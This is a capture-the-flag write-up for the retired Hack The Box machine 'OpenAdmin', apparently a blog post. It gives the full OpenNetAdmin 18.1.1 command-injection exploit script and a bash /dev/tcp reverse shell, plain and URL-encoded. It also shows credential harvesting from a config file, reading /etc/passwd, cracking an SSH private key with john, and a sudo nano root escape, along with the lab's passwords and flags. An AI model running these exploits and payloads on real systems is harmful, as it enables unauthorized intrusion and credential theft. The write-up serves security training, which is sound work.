---
title: OpenAdmin Writeup
date: 2020-11-06 00:38:56
categories: [HTB, retired]
published: true
tags: [writeup]
---

[![Banner](https://raw.githubusercontent.com/0xsyr0/0xsyr0.github.io/master/assets/img/htb/openadmin/openadmin_info_card.jpg)](https://www.hackthebox.eu/home/machines/profile/222)

# Information@openadmin:~$

| Column                       | Detail                                                       |
|:-----------------------------|:-------------------------------------------------------------|
| Name                         | OpenAdmin                                                    |
| IP                           | 10.10.10.171                                                 |
| Points                       | 20                                                           |
| OS                           | Linux                                                        |
| Difficulty                   | Easy                                                         |
| Creator                      | [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600) |
| Released on                  | 4 Jan 2020                                                   |
| Retired on                   | 2 May 2020                                                   |

# Brief@openadmin:~$

The box starts off with only port `TCP/22` and `TCP/80` open. After running gobuster against port 80, it revealed a **/music**
subdirectory which provided information about the software **OpenNetAdmin 18.1.1** running on it.

By using an remote code execution exploit from exploit-db, it was possible to get a shell on the box.

During some basic enumeration of the **/var/www** directory, the credentials for the privilege escalation to **jimmy** were found
in the file called **database_settings.inc.php**. With jimmy it was possible to access the internal directory.

Within the directory a file called **main.php** revealed the information that the **ssh private key** for **joanna** can be optained by
accessing the **main.php** on the interal listening webserver.

After generating a crackable **hash** out of the private key by using **ssh2john**, the password for the key could be cracked by
using **john** and the user flag could be taken.

Due some basic privilege testing the information showed up that joanna was able to execute **nano** with root privileges.
The last step was to find the command sequence on **GTFObins** and the box was owned.

# Summary

- Start off with nmap as always
- Gobuster reveals the **/music** directory
- Get information about the software **OpenNetAdmin**
- Get the **exploit** for the remote code execution from **exploit-db**
- After getting a **reverse shell**, upgrade the shell
- Start with enumerating **/var/www/**
- Find credentials in the **database_settings.inc.php** file
- Reuse the password for the user jimmy
- Enumerate the **internal** direcotry and find the **main.php** file
- Throw a **curl** request against the local listener to trigger the **main.php** file
- Optain the **ssh private key** for joanna
- Create a crackable hash using **ssh2john**
- Crack the password with **john**
- Login as joanna and take the **user.txt**
- Check the privileges of joanna and figure out that the user can start **nano** with **sudo**
- Get the command sequence for **nano** from **GTFObins**
- Execute it to pop a **root shell** and to optain the **root.txt**

# Reconnaissance

## Nmap

```console
$ sudo nmap -sC -sV -oA nmap 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
```

We notice that port `22/tcp` and port `80/tcp` are open.

## Gobuster

```console
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 18:51:23 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
```

# Footholding

Let's check the found directories and start with `/music`.

> http://10.10.10.171/music

When we click on `login` we are getting redirected.

> http://10.10.10.171/ona/

By using google we find an available exploit on exploit-db.

> https://www.exploit-db.com/exploits/47691

```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Let's download the raw exploit.

```console
$ wget https://www.exploit-db.com/raw/47691
```
Then we make it executable.

```console
$ chmod +x 47691.sh
```
At last we start the shell script and point it to the target url.
And a shell is popping up.

```console
$ ./47691.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Please make sure you don't forgett the `/` behind `ona` because that would break
your reverse shell.

Now this is a pretty restricted shell because we only can enter url encoded input
to get code execution.

In my case i used the `Burp Suite` included decoder to encode my payload for a
full working reverse shell.

> Payload:

```console
bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
```

> Encoded payload:

```console
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
```

Now we have to start a netcat listener on our desired port, then enter the url encoded 
string to our shell to get the reverse shell.

```console
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
```

To upgrade our shell to a bit more comfy one, we use python to import `/bin/bash`
and then we modify our shell output and exporting xterm.

```console
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This was the first part. For the next part we have to exactly enter the following
inputs, otherwise we will break your shell.

```console
Ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

If you ente everything correctly, you will get a full working shell on the box.

```console
www-data@openadmin:/opt/ona/www$ ^Z
[1]+  Stopped                 nc -lnvp 9001
$ stty raw -echo
$ nc -lnvp 9001

www-data@openadmin:/opt/ona/www$
www-data@openadmin:/opt/ona/www$ export XTERM=xterm
www-data@openadmin:/opt/ona/www$ ls
.htaccess.example  images/            login.php          winc/
config/            include/           logout.php         workspace_plugins/
config_dnld.php    index.php          modules/
dcm.php            local/             plugins/
www-data@openadmin:/opt/ona/www$ ls
```

Please notice that this only works with bash. If you are using zsh you may ran into some issues.

# Enumeration

At first we start with some basic manually enumeration on the `/var/www/` directory to see what
we get.

```console
www-data@openadmin:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

We notice that we have only access to html and to the directory we are landed after the footholding.
Furhter we have to privilege escalate to jimmy, to get access to the internal directory.

Let's check who else have an account on this box.

```console
www-data@openadmin:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

So we have another user. Let's take that to our nodes.

```console
User: jimmy
User: joanna
```

Now we check out what we find inside the ona directory we can access and have a
closer look to the `database_settings.inc.php` file.

```php
www-data@openadmin:/var/www/html/ona/local/config$  ls
database_settings.inc.php  motd.txt.example  run_installer
www-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

# Privilege Escalation to jimmy

And we are lucky to get credentials for the mysql database.

```console
User: ona_sys
Password: n1nj4W4rri0R!
```


Let's see if the password got reused by any of the known accounts.

```console
www-data@openadmin:/var/www/html/ona/local/config$ su - jimmy
Password: 
jimmy@openadmin:~$
```

# Privilege Escalation to joanna

Bingo! Now that we are successfully escalated to jimmy, let's check out the
internal directory.

In the `main.php` file we get a hint that the file runs on an webserver and
is able to cat out the **ssh private key** of joanna.

```console
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

In our nmap we couldn't find any other port or webserver so let's see if there is something
listening on `127.0.0.1` aka the **localhost**.

```console
jimmy@openadmin:~$ ss -tulpn
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:*
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
tcp    LISTEN   0        128                     *:80                   *:*
tcp    LISTEN   0        128                  [::]:22                [::]:*
```

The interesting port here is the high port `TCP/52846` which we immediately throw a curl at
to see if we can get the **private key**.

```console
jimmy@openadmin:/var/www$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Perfect! Now we save the key in a file on our local system and use john to convert it
into a readable format which we can crack.

```console
$ sudo /usr/share/john/ssh2john.py joanna_id_rsa > joanna_id_rsa_hash
```

With this done, it's time to crack the key.

```console
$ sudo john joanna_id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_id_rsa)
1g 0:00:00:07 DONE (2020-11-10 19:25) 0.1347g/s 1932Kp/s 1932Kc/s 1932KC/sa6_123..*7¡Vamos!
Session completed
```

Awesome! We get the password.

```console
Password: bloodninjas
```

Change the file permission on the key - like always.

```console
$ chmod 600 joanna_id_rsa
```

And login as joanna to grab the user flag.

```console
$ ssh -i joanna_id_rsa joanna@10.10.10.171
load pubkey "joanna_id_rsa": invalid format
Enter passphrase for key 'joanna_id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 10 18:34:55 UTC 2020

  System load:  0.32              Processes:             125
  Usage of /:   49.6% of 7.81GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
```

## user.txt

```console
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f
```

# The way to root

We start with having a look at the group memberships.

```console
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

So joanna doens't seems to have any special memberships so far. Let's try if joanna has an entry in the **sudors** file.

```console
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Well that's the case. The user joanna is able to execute the nano binary with root privileges in `/opt/priv` which means
that we can create a file in there.

Let's have a look at **gtfobins** if we can find some useful information to execute a root shell.

> https://gtfobins.github.io/gtfobins/nano/

Now we try to get this running.

```console
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

We press **Ctrl+r** and then **Ctrl+x**.

```console
Command to execute:
^G Get Help						^X Read File
^C Cancel						M-F New Buffer
```

Then we enter `reset; sh 1>&0 2>&0` and press enter to execute it.

As we can see we spawned a shell out of nano.

```console
Command to execute: reset; sh 1>&0 2>&0#
# id
uid=0(root) gid=0(root) groups=0(root)
```

## root.txt

All what we have to do is to grab the root flag and that's it!

```console
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
```

THE END

# Resources

| Topic                                           | URL                                                     |
|:------------------------------------------------|:--------------------------------------------------------|
| OpenNetAdmin 18.1.1 - Remote Code Execution     | [click here](https://www.exploit-db.com/exploits/4769)  |
| GTFOBins - nano                                 | [click here](https://gtfobins.github.io/gtfobins/nano/) |
